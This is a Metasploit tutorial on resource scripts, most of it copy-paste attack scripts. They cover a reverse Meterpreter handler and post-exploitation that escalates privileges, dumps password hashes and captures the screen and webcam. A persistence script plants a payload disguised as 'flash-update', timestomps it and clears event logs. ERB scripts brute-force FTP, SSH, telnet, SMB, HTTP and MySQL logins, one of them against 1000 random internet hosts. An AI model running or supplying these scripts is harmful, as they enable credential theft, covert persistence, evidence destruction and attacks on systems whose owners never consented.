## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | command syntax |
|-------|---|---|
| what are resource files? | [metasploit resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#what-are-resource-files) | msfconsole -x 'grep -m 1 resource help' |
| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
| RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
| using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |

<br />

## REFERENCIES

- [Rapid7 Resource Files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [Msfconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
- [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [My resource scripts repository](https://github.com/r00t-3xp10it/resource_files)
- [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
- [Rapid7 - automating the metasploit console](https://blog.rapid7.com/2010/03/22/automating-the-metasploit-console/)
- [INURLBR - metasploit automatizacao resource files](http://blog.inurl.com.br/2015/02/metasploit-automatizacao-resource-files_23.html)

---

<br /><br /><br />

## WHAT ARE RESOURCE FILES
The Metasploit Console (msfconsole) has supported the concept of resource files for quite some time. A resource file is essentially a batch script for Metasploit using these files you can automate common tasks. If you create a resource script called ~/.msf4/msfconsole.rc, it will automatically load each time you start the msfconsole interface. This is a great way to automatically connect to a database and set common parameters (setg PAYLOAD, setg RHOSTS, etc) As of revision r8876, blocks of Ruby code (ERB) can now be directly inserted into the resource script. This turns resource scripts into a generic automation platform for the Metasploit Framework.

The 'resource' command will execute msfconsole/meterpreter instructions located inside a text file containing one entry per line. 'resource' will execute each line in sequence. This can help automate repetitive actions performed users. By default the commands will run in current working dir (target machine) and resource file in local working dir (attacking machine).

WARNING: Before we can run a resource script, we need to identify the required parameters that need to be configured<br />for the script/auxiliary/exploit to run. Also remmenber to start postgresql service before interacting with metasploit console.

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

##  HOW TO RUN RESOURCE SCRIPTS?
<blockquote>You can run resource scripts from msfconsole or from the web interface. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the 'resource' command or you can run a resource script when you start msfconsole using the msfconsole -r flag (making msfconsole execute the resource script at startup).</blockquote>


To run resource script at **msfconsole startup** execute the follow command in your terminal:

      msfconsole -r /root/script.rc

To run resource script **inside msfconsole** execute the follow command in msfconsole:

      resource /root/script.rc

To run resource script **inside meterpreter** execute the follow command in meterpreter:

      resource /root/script.rc

To set a global variable (erb) and run resource script **msfconsole startup** execute the follow command:

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/http_CVE.rc'

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## HOW TO WRITE RESOURCE SCRIPTS?
<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. Personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the 'resource' command.</blockquote>

Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **version.rc**
```
  version
  exit -y
```
**[in terminal]::run the script::** `msfconsole -r /root/version.rc`

<br />

The next example show us how to use msfconsole 'makerc' core command to write our resource script.
```
   kali > msfconsole
   msf > version
   msf > makerc /root/version.rc
```
**[in msfconsole]::Run the script::** `resource /root/version.rc`

<br /><br />

<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **handler.rc**
```
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_https
   set ExitOnSession false
   set LHOST 192.168.1.71
   set LPORT 666
   exploit
```
**[in terminal]::Run the script::** `msfconsole -r /root/handler.rc`

<br />

The next example show us how to use msfconsole makerc core command to write our resource script.
```
   kali > msfconsole
   msf > use exploit/multi/handler
   msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
   msf exploit(multi/handler) > set ExitOnSession false
   msf exploit(multi/handler) > set LHOST 192.168.1.71
   msf exploit(multi/handler) > set LPORT 666
   msf exploit(multi/handler) > exploit
   msf exploit(multi/handler) > makerc /root/handler.rc
```
**[in msfconsole]::Run the script::** `resource /root/handler.rc`

<br /><br />

<blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **record.rc**
```
   spool /root/logfile.log
   loadpath /root/msf-auxiliarys
   version
   sessions -v
   resource /root/handler.rc
   makerc /root/commands.rc
```
**[in terminal]::Run the script::** `msfconsole -r /root/record.rc`

![gif](http://i68.tinypic.com/343oefb.gif)

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN POST EXPLOITATION
<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **post.rc**
```
   getprivs
   getsystem
   hashdump
   screenshot
   webcan_snap -v false
   migrate -n wininit.exe
     use post/windows/gather/enum_applications
   run
     use post/multi/recon/local_exploit_suggester
   run
```
**[in meterpreter]::Run the script::** `resource /root/post.rc`

<br /><br />

<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev). Remmenber that you must have the update.exe in your working directory (local) to be uploaded to target system.</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **persistence.rc**
```
 getprivs
 getsystem
 migrate -n explorer.exe
  upload /root/update.exe %temp%\\update.exe
  timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
  reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
  scheduleme -m 10 -c "%temp%\\update.exe"
 clearev
```
**[in meterpreter]::Run the script::** `resource /root/persistence.rc`

<br /><br />

<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using 'SETG' (global variable declarations) to configure all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The rc script will then run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **http_brute.rc**
```
   setg THREADS 15
   setg RHOSTS 192.168.1.0/24
     use auxiliary/scanner/http/http_version
   run
     use auxiliary/scanner/http/dir_scanner
   run
     use auxiliary/scanner/http/http_login
   run
   unsetg RHOSTS THREADS
```
**[in terminal]::Run the script::** `msfconsole -r /root/http_brute.rc`

![gif](http://i66.tinypic.com/2usid92.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN AutoRunScript
<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **gather.rc**
```
   sysinfo
   getuid
   services
   sessions -v
```

Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **post_handler.rc**
```
   setg RESOURCE /root/gather.rc
    use exploit/multi/handler
    set AutoRunScript post/multi/gather/multi_command
    set PAYLOAD windows/meterpreter/reverse_https
    set ExitOnSession false
    set LHOST 192.168.1.71
    set LPORT 666
   exploit
   unsetg RESOURCE
```
**[in terminal]::Run the script::** `msfconsole -r /root/post_handler.rc`

<br /><br />

- **[in Handler]::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
<blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>

      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'

![gif](http://i67.tinypic.com/20aotfr.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## USING RUBY IN RC (ERB scripting)
<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit API calls.</blockquote>

Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **template.rc**
```
<ruby>
   help = %Q|
    Description:
       This Metasploit RC file can be used to automate the exploitation process.
       In this example we are just checking msfdb connection status, list database
       hosts, services and export the contents of database to template.xml local file.

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>
    |
    print_line(help)
    Rex::sleep(1.5)

       print_good("checking database connection")
       Rex::sleep(2)
       run_single("db_status")
       print_good("checking database sevices")
       Rex::sleep(2)
       run_single("services")
       print_good("checking database hosts")
       Rex::sleep(2)
       run_single("hosts")

    print_warning("exporting database to: template.xml")
    Rex::sleep(1.5)
    run_single("db_export -f xml template.xml")
</ruby>
```
**[in terminal]::Run the script:** `msfconsole -r /root/template.rc`

<br /><br />

<blockquote>The next resource script uses 'db_nmap' metasploit core command to populate the msf database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts that are stored inside the msf database (db_nmap scan used: 192.168.1.0/24).</blockquote>

Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **http_recon.rc**
```
   <ruby>
     help = %Q|
       Description:
         This Metasploit RC file can be used to automate the exploitation process.
         In this example we are using db_nmap to populate msfdb database with hosts
         then it triggers auxiliary/http/scanner modules againts all hosts inside db.

       Author:
         r00t-3xp10it  <pedroubuntu10[at]gmail.com>
     |
     print_line(help)
     Rex::sleep(1.5)

     run_single("db_nmap -sV -Pn -T4 -p 80 --script=http-headers.nse,http-security-headers.nse,ip-geolocation-geoplugin.nse --open 192.168.1.0/24")
     run_single("services")
     xhost = framework.db.hosts.map(&:address).join(' ')
           run_single("setg RHOSTS #{xhost}")
           print_status("Runing auxiliary modules.")
           run_single("use auxiliary/scanner/http/title")
           run_single("exploit")
           run_single("use auxiliary/scanner/http/dir_scanner")
           run_single("exploit")
           run_single("use auxiliary/scanner/http/http_login")
           run_single("exploit")
     print_warning("Please wait, cleaning recent configurations..")
     run_single("unsetg RHOSTS")
     run_single("services -d")
     run_single("hosts -d")
   </ruby>
```
**[in terminal]::Run the script::** `msfconsole -r /root/http_recon.rc`

<br /><br />

<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user inputs (RHOSTS) and (USERPASS_FILE) throuth the 'SETG' global variable declaration, if none value has povided then this resource script will use is own default values.</blockquote>

<br />

**setg** In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set you can use them in as many exploits and auxiliary modules as you like to prevent always check auxiliary options before you run or exploit. Conversely, you can use the **unsetg** command to unset a global var.

Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **brute_force.rc**
```
   <ruby>
      help = %Q|
        Description:
          This Metasploit RC file can be used to automate the exploitation process.
          In this example we are using db_nmap to populate msfdb database with hosts
          then it triggers msf auxiliary/scanners based on target open ports reported.
          this module probes for 21:22:23:80:110:445 remote TCP ports open.

        Execute in msfconsole:
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/brute_force.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(1.5)

      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      end
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end

      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      run_single("setg RHOSTS #{xhost}")

         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("please wait, cleaning recent configurations.")
              run_single("unsetg RHOSTS USERPASS_FILE")
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 21:22:23:80:110:445 open ports.")
              print_error("please wait, cleaning recent configurations.")
              run_single("unsetg RHOSTS USERPASS_FILE")
              run_single("services -d")
              run_single("hosts -d")
              return nil
         end

         if xport =~ /21/i
              print_warning("Remote Target port: 21 ftp found")
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 70")
              run_single("exploit")
         end

         if xport =~ /22/i
              print_warning("Remote Target port: 22 ssh found")
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 30")
              run_single("exploit")
         end

         if xport =~ /23/i
              print_warning("Remote Target port: 23 telnet found")
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /110/i
              print_warning("Remote Target port: 110 pop3 found")
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 30")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /445/i
              print_warning("Remote Target port: 445 smb found")
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /80/i
              print_warning("Remote Target port: 80 http found")
              run_single("use auxiliary/scanner/http/title")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 11")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end
      print_warning("please wait, Cleaning msfdb Database.")
      run_single("unsetg RHOSTS USERPASS_FILE")
      run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
     run_single("services -d")
     run_single("hosts -d")
   </ruby>
```
**[in terminal]::Run the script::** `msfconsole -r /root/brute_force.rc`

<br /><br />

<blockquote>mysql_brute will use nmap to search/check for port 3306 open (mysql) then it populates the msfdb with a list of hosts found, and run auxiliary modules to gather info and brute force mysql services. if none value (setg) has povided then this resource script will use is own default values. (example: scan rhosts 192.168.1.0/24)</blockquote>

Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **mysql_brute.rc**
```
   <ruby>
      help = %Q|
        Description:
          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
          setg RHOSTS 192.168.1.71 192.168.1.254 - To instruct db_nmap to check targets for port 3306 open
          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
          mysql_brute will use nmap to search/check for port 3306 open, then it populates the msfdb with
          a list of hosts found, and run auxiliary modules to gather info and brute force mysql services.
          if none value (setg) has povided then this resource script will use is own default values.

        Execute in msfconsole:
          setg RANDOM_HOSTS <true-or-blank>
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/mysql_brute.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(2.0)

      if (framework.datastore['RANDOM_HOSTS'] == 'true')
         print_line("RHOSTS => nmap -sV -Pn -T4 -O -iR 1000 -p 3306 --script=mysql-info.nse --open")
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end
      unless (framework.datastore['RANDOM_HOSTS'] == 'true')
         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
      else
         print_warning("db_nmap: search for random remote targets with port 3306 open (mysql)")
         run_single("db_nmap -sV -Pn -T4 -O -iR 1000 --script=mysql-info.nse -p 3306 --open")
      end

      run_single("spool /root/mysql_brute.log")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')

         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 3306 open ports.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
              run_single("services -d")
              run_single("hosts -d")
              return nil
         end

         print_status("Operative systems: #{xname}")
         run_single("setg RHOSTS #{xhost}")
         Rex::sleep(2.0)
         if xport =~ /3306/i
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/admin/mysql/mysql_enum")
              run_single("set USERNAME root")
              run_single("set PASSWORD root")
              run_single("set THREADS 20")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              run_single("exploit")
              Rex::sleep(1.5)
       end

       print_warning("Please wait, Cleaning msfdb Database.")
       Rex::sleep(1.0)
       run_single("unsetg RHOSTS RANDOM_HOSTS USERPASS_FILE")
       run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
       run_single("services -d")
       run_single("hosts -d")
       print_warning("Logfile stored under: /root/mysql_brute.log")
</ruby>
```
**[in terminal]::Run the script::** `msfconsole -q -x 'setg RANDOM_HOSTS true; resource /root/mysql_brute.rc'`

<br />

![pic](http://i67.tinypic.com/34znijd.gif)

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br />

## Suspicious Shell Activity (Red Team) @2019


